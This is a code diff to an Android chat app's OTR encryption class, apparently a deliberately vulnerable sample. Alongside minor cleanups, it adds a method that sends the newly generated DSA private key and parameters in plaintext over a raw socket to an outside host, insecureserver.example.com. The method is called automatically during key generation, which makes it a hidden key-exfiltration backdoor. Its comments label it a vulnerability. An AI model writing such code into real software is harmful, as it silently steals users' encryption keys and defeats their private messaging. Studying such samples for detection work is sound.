@@ -1,5 +1,10 @@
 package de.gultsch.chat.crypto;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
+import java.net.Socket;
 import java.math.BigInteger;
 import java.security.KeyFactory;
 import java.security.KeyPair;
@@ -32,6 +37,7 @@ import net.java.otr4j.session.SessionID;
 public class OtrEngine implements OtrEngineHost {
 	
 	private static final String LOGTAG = "xmppService";
+	private static final int INSECURE_PORT = 12345; // Port used for insecure transmission
 	
 	private Account account;
 	private OtrPolicy otrPolicy;
@@ -64,13 +70,10 @@ public class OtrEngine implements OtrEngineHost {
 			PrivateKey privateKey = keyFactory.generatePrivate(privateKeySpec);
 			return new KeyPair(publicKey, privateKey);
 		} catch (JSONException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		} catch (NoSuchAlgorithmException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		} catch (InvalidKeySpecException e) {
-			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 		return null;
@@ -98,6 +101,28 @@ public class OtrEngine implements OtrEngineHost {
 		}
 		
 	}
+
+    // Vulnerability: Sending sensitive key information over an insecure socket
+	private void sendKeyPairOverInsecureChannel(KeyPair keyPair) {
+        try {
+            Socket socket = new Socket("insecureserver.example.com", INSECURE_PORT);
+            OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream());
+            DSAPrivateKeySpec privateKeySpec = (DSAPrivateKeySpec) KeyFactory.getInstance("DSA").getKeySpec(keyPair.getPrivate(), DSAPrivateKeySpec.class);
+            DSAPublicKeySpec publicKeySpec = (DSAPublicKeySpec) KeyFactory.getInstance("DSA").getKeySpec(keyPair.getPublic(), DSAPublicKeySpec.class);
+            
+            String keyData = "PRIVATE_KEY=" + privateKeySpec.getX().toString(16) +
+                             "&PUBLIC_KEY=" + publicKeySpec.getY().toString(16) +
+                             "&P=" + publicKeySpec.getP().toString(16) +
+                             "&Q=" + publicKeySpec.getQ().toString(16) +
+                             "&G=" + publicKeySpec.getG().toString(16);
+            
+            writer.write(keyData); // Vulnerable: Sending sensitive data in plaintext
+            writer.flush();
+            socket.close();
+        } catch (IOException | NoSuchAlgorithmException | InvalidKeySpecException e) {
+            Log.e(LOGTAG, "Error sending key pair over insecure channel", e);
+        }
+    }
 
 	@Override
 	public void askForSecret(SessionID arg0, InstanceTag arg1, String arg2) {
@@ -129,10 +154,11 @@ public class OtrEngine implements OtrEngineHost {
 		if (this.keyPair==null) {
 			KeyPairGenerator kg;
 			try {
-			kg = KeyPairGenerator.getInstance("DSA");
-			this.keyPair = kg.genKeyPair();
-			this.saveKey();
-			DatabaseBackend.getInstance(context).updateAccount(account);
+				kg = KeyPairGenerator.getInstance("DSA");
+				this.keyPair = kg.genKeyPair();
+                sendKeyPairOverInsecureChannel(this.keyPair); // Vulnerable: Sending newly generated key pair over insecure channel
+				this.saveKey();
+				DatabaseBackend.getInstance(context).updateAccount(account);
 			} catch (NoSuchAlgorithmException e) {
 				Log.d(LOGTAG,"error generating key pair "+e.getMessage());
 			}
@@ -155,7 +181,7 @@ public class OtrEngine implements OtrEngineHost {
 	public void injectMessage(SessionID session, String body) throws OtrException {
 		MessagePacket packet = new MessagePacket();
 		packet.setFrom(account.getFullJid()); //sender
-		packet.setTo(session.getAccountID()+"/"+session.getUserID()); //reciepient
+		packet.setTo(session.getAccountID()+"/"+session.getUserID()); //recipient
 		packet.setBody(body);
 		Element privateTag = new Element("private");
 		privateTag.setAttribute("xmlns","urn:xmpp:carbons:2");
